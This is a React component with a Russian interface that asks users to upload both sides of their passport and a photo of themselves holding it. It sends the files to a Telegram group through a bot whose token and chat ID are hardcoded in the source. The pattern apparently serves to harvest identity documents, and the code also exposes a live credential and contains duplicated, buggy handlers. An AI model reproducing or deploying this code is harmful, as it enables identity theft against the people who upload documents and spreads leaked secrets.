import "./Scss/Contact.scss";
import React, { useState } from "react";
import Pass from "../../assets/pass.png";
import axios from "axios";
import Passport from "../../assets/passport.png";

function Contact({ changeModal, russian }) {
  const [imgValue, setimgValue] = useState("");
  const [imgValue2, setimgValue2] = useState("");
  const [invalidImg, setInvalidImg] = useState(false);
  const [invalidImg2, setInvalidImg2] = useState(false);
  const [file, setfile] = useState();
  const [file2, setfile2] = useState();

  function changeImg(e) {
    setimgValue(e.target.value);
    setInvalidImg(false);
  }

  function changeImg2(e) {
    setimgValue2(e.target.value);
    setInvalidImg2(false);
  }
  function handleChange7(e) {
    setfile(e.target.files[0]);
  }
  function handleChange2(e) {
    setfile2(e.target.files[0]);
  }

  let bot = {
    TOKEN: "5899353524:AAEtoWWvOlLcSc9hL5Zo2QruQPAPnNMOmyk",
    chatID: "-1001716171795",
    message: `%0APasporting rasmi: ${imgValue}; %0APasport bilan tushgan rasmi: ${imgValue2};`,
  };

  function sendMessage() {
    if (imgValue === "") {
      setInvalidImg(true);
    } else if (imgValue === "") {
      setInvalidImg2(true);
    } else {
      fetch(
        `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${bot.message} `,
        {
          method: "GET",
        }
      ).then(
        (success) => {
          console.log("send message");
        },
        (error) => {
          console.log(error);
        }
      );

      changeModal();
      setimgValue("");
      setimgValue2("");
    }
    const formData = new FormData();
    const formData1 = new FormData();
    formData.append("chat_id", bot.chatID);
    formData1.append("chat_id", bot.chatID);
    formData.append("document", file);
    formData1.append("document", file2);

    axios
      .post(`https://api.telegram.org/bot${bot.TOKEN}/sendDocument`, formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      })
      .then(
        (success) => {
          console.log("send message");
        },
        (error) => {
          console.log(error);
        }
      );
    setTimeout(() => {
      axios
        .post(
          `https://api.telegram.org/bot${bot.TOKEN}/sendDocument`,
          formData1,
          {
            headers: {
              "Content-Type": "multipart/form-data",
            },
          }
        )
        .then(
          (success) => {
            console.log("send message");
          },
          (error) => {
            console.log(error);
          }
        );
    }, 1000);
  }
  function sendMessage2() {
    if (imgValue === "") {
      setInvalidImg(true);
    } else if (imgValue === "") {
      setInvalidImg2(true);
    } else {
      fetch(
        `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${bot.message} `,
        {
          method: "GET",
        }
      ).then(
        (success) => {
          console.log("send message");
        },
        (error) => {
          console.log(error);
        }
      );

      changeModal();
      setimgValue("");
      setimgValue2("");
    }
    const formData = new FormData();
    const formData1 = new FormData();
    formData.append("chat_id", bot.chatID);
    formData1.append("chat_id", bot.chatID);
    formData.append("document", file);
    formData1.append("document", file2);

    axios
      .post(`https://api.telegram.org/bot${bot.TOKEN}/sendDocument`, formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      })
      .then(
        (success) => {
          console.log("send message");
        },
        (error) => {
          console.log(error);
        }
      );
    setTimeout(() => {
      axios
        .post(
          `https://api.telegram.org/bot${bot.TOKEN}/sendDocument`,
          formData1,
          {
            headers: {
              "Content-Type": "multipart/form-data",
            },
          }
        )
        .then(
          (success) => {
            console.log("send message");
          },
          (error) => {
            console.log(error);
          }
        );
    }, 1000);
  }
  // function sendMessage(e) {
  // send message file

  return (
    <div className="Contact">
      <div className="wrapper">
        <div className="body-pass">
          <div className="passport">
            <h3 className="pass">Загрузите обе стороны паспорта</h3>
            <p className="passDesc">
              PDF, JPG
              <input
                className={`copy-pass`}
                onChange={(e) => handleChange7(e)}
                type="file"
              />
            </p>
            <img
              src={Passport}
              alt="passport"
              className={`copy-pass ${invalidImg && "red-line"}`}
              value={imgValue}
              onChange={(e) => handleChange2(e)}
            />
            <br />
            <button className="btn" onClick={() => sendMessage2()}>
              отправлять
            </button>
          </div>
          <div className="passport">
            <h3 className="pass">
              Загрузите фото, на котором вы держите паспорт
            </h3>
            <p className="passDesc">
              PDF, JPG
              <input
                className={`copy-pass`}
                onChange={(e) => handleChange7(e)}
                type="file"
              />
            </p>
            <img
              src={Pass}
              alt="passport"
              className={`copy-pass2 ${invalidImg2 && "red-line"}`}
              value={imgValue2}
              onChange={(e) => changeImg2(e)}
            />
            <br />
            <button className="btn" onClick={() => sendMessage()}>
              отправлять
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Contact;
